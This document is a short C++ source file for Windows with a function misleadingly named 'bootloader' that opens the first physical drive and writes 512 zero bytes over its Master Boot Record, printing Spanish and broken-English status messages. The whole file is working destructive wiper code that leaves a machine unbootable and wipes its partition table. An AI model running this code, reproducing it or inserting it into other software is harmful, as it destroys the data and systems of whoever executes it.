#include <windows.h>
#include <iostream>
using namespace std;
#define MBR_SIZE 512
void bootloader()
{
    DWORD write;
    char mbrData[MBR_SIZE];
    ZeroMemory(&mbrData, sizeof(mbrData));
    SECURITY_ATTRIBUTES securityAttributes;
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.lpSecurityDescriptor = NULL;
    securityAttributes.bInheritHandle = FALSE;
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, &securityAttributes, OPEN_EXISTING, 0, NULL);
    if (MasterBootRecord == INVALID_HANDLE_VALUE) {
        cout << "Fallo al abrir el dispositivo. Error: " << GetLastError() << endl;
        Sleep(5000);
    }
    if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
        cout << "Master Boot Record escrito correctamente!" << endl;
        Sleep(5000);
    }
    else {
        cout << "Fail to wraiting Master Boot Record. Error: " << GetLastError() << endl;
        Sleep(5000);
    }
    CloseHandle(MasterBootRecord);
}
